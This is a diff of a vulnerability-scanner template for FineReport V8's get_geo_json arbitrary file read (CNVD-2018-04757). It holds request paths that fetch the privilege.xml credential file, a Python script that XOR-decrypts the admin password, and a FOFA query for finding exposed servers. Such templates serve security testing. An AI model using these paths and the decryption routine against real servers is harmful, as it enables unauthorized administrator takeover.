@@ -1,35 +1,47 @@
-expression: r0()
 id: CNVD-2018-04757
+
 info:
+  name: 帆软报表 V8 get_geo_json 任意文件读取漏洞
   author: zan8in
-  description: "FineReport\u62A5\u8868\u8F6F\u4EF6\u662F\u4E00\u6B3E\u7EAFJava\u7F16\
-    \u5199\u7684\uFF0C\u96C6\u6570\u636E\u5C55\u793A(\u62A5\u8868)\u548C\u6570\u636E\
-    \u5F55\u5165(\u8868\u5355)\u529F\u80FD\u4E8E\u4E00\u8EAB\u7684\u4F01\u4E1A\u7EA7\
-    web\u62A5\u8868\u5DE5\u5177\u3002\nFineReport v8.0\u7248\u672C\u5B58\u5728\u4EFB\
-    \u610F\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\u53EF\u5229\
-    \u7528\u6F0F\u6D1E\u8BFB\u53D6\u7F51\u7AD9\u4EFB\u610F\u6587\u4EF6\n\u4F7F\u7528\
-    \u5982\u4E0B\u89E3\u5BC6\u811A\u672C\u53EF\u89E3\u5BC6\u5F97\u5230\u5BC6\u7801\
-    \n```\n  cipher = '___0072002a00670066000a' #\u5BC6\u6587\n  PASSWORD_MASK_ARRAY\
-    \ = [19, 78, 10, 15, 100, 213, 43, 23] #\u63A9\u7801\n  Password = \"\"\n  cipher\
-    \ = cipher[3:] #\u622A\u65AD\u4E09\u4F4D\u540E\n  for i in range(int(len(cipher)\
-    \ / 4)):\n      c1 = int(\"0x\" + cipher[i * 4:(i + 1) * 4], 16)\n      c2 = c1\
-    \ ^ PASSWORD_MASK_ARRAY[i % 8]\n      Password = Password + chr(c2)\n  print (Password)\n\
-    ```\nbody=\"isSupportForgetPwd\"\n"
-  name: "\u5E06\u8F6F\u62A5\u8868 V8 get_geo_json \u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\
-    \u6F0F\u6D1E"
-  reference:
-  - https://mp.weixin.qq.com/s/339OfovdxZ98HHBXFnjOFQ
   severity: critical
+  verified: true
+  description: |
+    FineReport报表软件是一款纯Java编写的，集数据展示(报表)和数据录入(表单)功能于一身的企业级web报表工具。
+    FineReport v8.0版本存在任意文件读取漏洞，攻击者可利用漏洞读取网站任意文件
+    使用如下解密脚本可解密得到密码
+    ```
+      cipher = '___0072002a00670066000a' #密文
+      PASSWORD_MASK_ARRAY = [19, 78, 10, 15, 100, 213, 43, 23] #掩码
+      Password = ""
+      cipher = cipher[3:] #截断三位后
+      for i in range(int(len(cipher) / 4)):
+          c1 = int("0x" + cipher[i * 4:(i + 1) * 4], 16)
+          c2 = c1 ^ PASSWORD_MASK_ARRAY[i % 8]
+          Password = Password + chr(c2)
+      print (Password)
+    ```
+    fofa: body="isSupportForgetPwd"
+  reference:
+    - https://mp.weixin.qq.com/s/339OfovdxZ98HHBXFnjOFQ
+  tags: cnvd,cnvd2018,fileread,fanruan
+  created: 2020/09/11
+  requires: [fanruan]
+  requires-mode: opportunistic
+
 rules:
   r0:
-    expression: response.status == 200 && response.body.bcontains(b'<![CDATA[admin]]')
-      && response.body.bcontains(b'op=fr_platform]]>') && response.body.bcontains(b'PrivilegeManager')
+    brute:
+      mode: clusterbomb
+      commit: winner
+      continue: false
+      p:
+        - /WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
+        - /report/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
     request:
       method: GET
-      path: /WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
-  r1:
-    expression: response.status == 200 && response.body.bcontains(b'<![CDATA[admin]]')
-      && response.body.bcontains(b'op=fr_platform]]>') && response.body.bcontains(b'PrivilegeManager')
-    request:
-      method: GET
-      path: /report/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
+      path: "{{p}}"
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b'rootManagerName') &&
+      response.body.bcontains(b'CDATA')
+expression: r0()
